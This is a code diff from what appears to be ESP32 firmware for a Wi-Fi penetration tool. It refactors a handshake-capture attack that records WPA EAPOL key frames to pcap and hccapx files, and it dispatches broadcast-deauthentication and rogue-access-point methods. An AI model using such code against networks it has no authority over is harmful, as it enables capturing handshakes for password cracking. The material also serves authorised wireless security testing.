@@ -24,8 +24,7 @@
 
 namespace {
 const char *TAG = "main:attack_handshake";
-attack_handshake_methods_t method = attack_handshake_methods_t::ATTACK_HANDSHAKE_METHOD_PASSIVE;
-ap_records_t gApRecords = {0, NULL};
+attack_handshake_methods_t gMethod = attack_handshake_methods_t::ATTACK_HANDSHAKE_METHOD_PASSIVE;
 }  // namespace
 
 /**
@@ -48,11 +47,10 @@ static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int3
   hccapx_serializer_add_frame((data_frame_t *)frame->payload);
 }
 
-void attack_handshake_start(const attack_config_t *attack_config) {
+void attack_handshake_start(attack_config_t attack_config) {
   ESP_LOGI(TAG, "Starting handshake attack...");
-  method = (attack_handshake_methods_t)attack_config->method;
-  gApRecords = attack_config->ap_records;  // Take ownership
-  const wifi_ap_record_t *ap_record = gApRecords.records[0];
+  gMethod = (attack_handshake_methods_t)attack_config.method;
+  const wifi_ap_record_t *ap_record = attack_config.ap_records[0];
   pcap_serializer_init();
   hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
   wifictl_sniffer_filter_frame_types(true, false, false);
@@ -60,14 +58,14 @@ void attack_handshake_start(const attack_config_t *attack_config) {
   frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
   ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME,
                                              &eapolkey_frame_handler, NULL));
-  switch (method) {
+  switch (gMethod) {
     case ATTACK_HANDSHAKE_METHOD_BROADCAST:
       ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
-      attack_method_broadcast(&gApRecords, 5);
+      attack_method_broadcast(attack_config.ap_records, 5);
       break;
     case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
       ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
-      attack_method_rogueap(&gApRecords, 0);
+      attack_method_rogueap(attack_config.ap_records, 0);
       break;
     case ATTACK_HANDSHAKE_METHOD_PASSIVE:
       ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
@@ -79,7 +77,7 @@ void attack_handshake_start(const attack_config_t *attack_config) {
 }
 
 void attack_handshake_stop() {
-  switch (method) {
+  switch (gMethod) {
     case ATTACK_HANDSHAKE_METHOD_BROADCAST:
       attack_method_broadcast_stop();
       break;
@@ -97,10 +95,7 @@ void attack_handshake_stop() {
   frame_analyzer_capture_stop();
   ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));
 
-  method = attack_handshake_methods_t::ATTACK_HANDSHAKE_METHOD_PASSIVE;
-  gApRecords.len = 0;
-  free(gApRecords.records);
-  gApRecords.records = NULL;
+  gMethod = attack_handshake_methods_t::ATTACK_HANDSHAKE_METHOD_PASSIVE;
 
   ESP_LOGD(TAG, "Handshake attack stopped");
 }
